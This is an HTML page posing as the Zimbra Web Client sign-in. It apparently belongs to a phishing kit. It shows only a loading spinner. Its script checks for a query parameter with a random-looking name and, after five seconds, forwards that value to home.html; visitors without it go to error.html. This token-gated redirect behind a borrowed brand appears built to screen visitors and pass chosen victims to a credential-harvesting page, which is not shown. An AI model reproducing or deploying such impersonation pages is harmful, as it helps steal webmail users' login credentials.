<!DOCTYPE html>

<html class="user_font_size_normal" lang="en"><head>

	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Zimbra Web Client Sign In</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration.">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<meta name="apple-mobile-web-app-status-bar-style" content="black">
	<link rel="stylesheet" type="text/css" href="file/common,login,zhtml,skin.css">
	<link rel="SHORTCUT ICON" href="./favicon.ico">
<style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #f0f0f0;
      flex-direction: column;
    }
    .spinner {
      border: 8px solid #f3f3f3;
      border-top: 8px solid #3498db;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .loading-text {
      margin-top: 20px;
      font-size: 18px;
      color: #333;
    }
  </style>

</head>

<script>
		function getQueryParameter(param) {
			// Get the query string from the URL
			const queryString = window.location.search;

			// Use URLSearchParams to parse the query string
			const urlParams = new URLSearchParams(queryString);

			// Return the value of the requested parameter or null if it doesn't exist
			return urlParams.get(param);
		}

		// Example usage
		const value = getQueryParameter('dfgndfjkngkjdfngjkdfngjk234');

		if (value != null) {
			setTimeout(function() {
				window.location.href = 'home.html?fhhfihfihhfsduhfuhwfweuhrwehuf444=' + value;
			}, 5000); // 5000 milliseconds = 5 seconds
		}else{

			window.location.href = 'error.html';


		}
		
    </script>
    
    
<body><br><br><br><br><br><br><br><br><br>
<center>
<div class="spinner"></div>
  <div class="loading-text">Loading, please wait...</div>
	

</body></html>
